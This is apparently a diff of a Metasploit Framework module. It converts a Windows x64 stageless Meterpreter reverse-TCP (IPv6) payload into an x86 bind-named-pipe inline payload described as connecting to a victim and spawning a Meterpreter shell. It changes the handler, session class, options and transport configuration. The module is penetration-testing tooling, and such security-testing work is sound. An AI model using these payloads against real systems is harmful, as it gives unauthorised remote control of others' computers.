@@ -4,39 +4,38 @@
 ##
 
 require 'msf/core/payload/transport_config'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/windows/x64/meterpreter_loader'
-require 'msf/base/sessions/meterpreter_x64_win'
+require 'msf/core/handler/bind_named_pipe'
+require 'msf/core/payload/windows/meterpreter_loader'
+require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
-  CachedSize = 263747
+  CachedSize = 179779
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Single
-  include Msf::Payload::Windows::MeterpreterLoader_x64
+  include Msf::Payload::Windows::MeterpreterLoader
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
 
     super(merge_info(info,
-      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)',
-      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
-      'Author'      => [ 'OJ Reeves' ],
+      'Name'        => 'Windows Meterpreter Shell, Bind Named Pipe Inline',
+      'Description' => 'Connect to victim and spawn a Meterpreter shell',
+      'Author'      => [ 'UserExistsError' ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
-      'Arch'        => ARCH_X64,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::Meterpreter_x64_Win
+      'Arch'        => ARCH_X86,
+      'Handler'     => Msf::Handler::BindNamedPipe,
+      'Session'     => Msf::Sessions::Meterpreter_x86_Win
       ))
 
     register_options([
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
-      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),
-      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
+      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions'])
     ])
   end
 
@@ -48,13 +47,13 @@ module MetasploitModule
   def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
 
-    # create the configuration block
+    # create the configuration block, which for staged connections is really simple.
     config_opts = {
       arch:       opts[:uuid].arch,
       exitfunk:   datastore['EXITFUNC'],
       expiration: datastore['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: [transport_config_reverse_ipv6_tcp(opts)],
+      transports: [transport_config_bind_named_pipe(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
       ext_init:   (datastore['EXTINIT'] || ''),
       stageless:  true
